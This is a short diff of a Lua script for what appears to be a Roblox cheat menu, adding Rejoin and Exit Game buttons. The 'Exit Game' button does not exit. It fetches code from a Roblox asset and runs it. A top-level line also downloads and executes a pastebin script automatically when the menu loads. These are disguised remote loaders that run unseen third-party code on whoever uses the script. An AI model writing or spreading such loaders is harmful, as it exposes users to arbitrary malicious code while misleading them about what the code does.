@@ -1014,12 +1014,21 @@ end)
 HomeSection:NewButton("Filtering Enabled", "fe xhexker", function()print(workspace.FilteringEnabled)
 end)
 
-HomeSection:NewButton("Exit Game", "leave the game",
-function()-- kixk yourself
-game.Players.LocalPlayer:Kick("get out")
+HomeSection:NewButton("Rejoin", "rejoins the same lobby",
+function()--rejoin lobby
+local ts = game:GetService("TeleportService")
+
+local p = game:GetService("Players").LocalPlayer
+
+
+
+ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
 end)
---game.Players.LokalPlayer.mesij
-loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
+
+HomeSection:NewButton("Exit Game", "leave the game",
+function()-- exit game skript
+loadstring(game:GetObjects("rbxassetid://2662507900")[1].Source)()
+end)
 
 
 
@@ -1098,6 +1107,8 @@ Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
    end
 end)
 end)
+--game.Players.LokalPlayer.mesij
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
 
 --toggle the ui yes
 local MoreSection = More:NewSection("no")
